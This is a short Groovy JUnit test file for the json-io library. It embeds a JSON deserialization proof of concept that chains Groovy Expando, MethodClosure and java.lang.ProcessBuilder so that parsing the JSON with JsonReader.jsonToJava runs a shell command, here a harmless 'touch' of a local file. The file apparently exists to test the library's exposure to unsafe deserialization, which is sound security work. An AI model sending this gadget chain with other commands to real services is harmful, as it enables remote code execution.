package com.cedarsoftware.util.io

import org.junit.jupiter.api.Test

class TestProcessBuilder
{
    @Test
    void testPB()
    {
        String poc = """\
{
  "@type": "java.util.Arrays\$ArrayList",
  "@Items": [
    {
      "@id": 2,
      "@type": "groovy.util.Expando",
      "expandoProperties": {
        "@type": "java.util.HashMap",
        "hashCode": {
          "@type": "org.codehaus.groovy.runtime.MethodClosure",
          "method": "start",
          "delegate": {
            "@id": 1,
            "@type": "java.lang.ProcessBuilder",
            "command": {
              "@type": "java.util.ArrayList",
              "@Items": [
                "touch",
                "/Users/jderegnaucourt/tmp"
              ]
            },
            "directory": null,
            "environment": null,
            "redirectErrorStream": false,
            "redirects": null
          },
          "owner": {
            "@ref": 1
          },
          "thisObject": null,
          "resolveStrategy": 0,
          "directive": 0,
          "parameterTypes": [],
          "maximumNumberOfParameters": 0,
          "bcw": null
        }
      }
    },
    {
      "@type": "java.util.HashMap",
      "@Keys": [
        {
          "@ref": 2
        },
        {
          "@ref": 2
        }
      ],
      "@Items": [
        {
          "@ref": 2
        },
        {
          "@ref": 2
        }
      ]
    }
  ]
}"""
        Object obj = JsonReader.jsonToJava(poc);
        System.out.print(obj);
    }
}
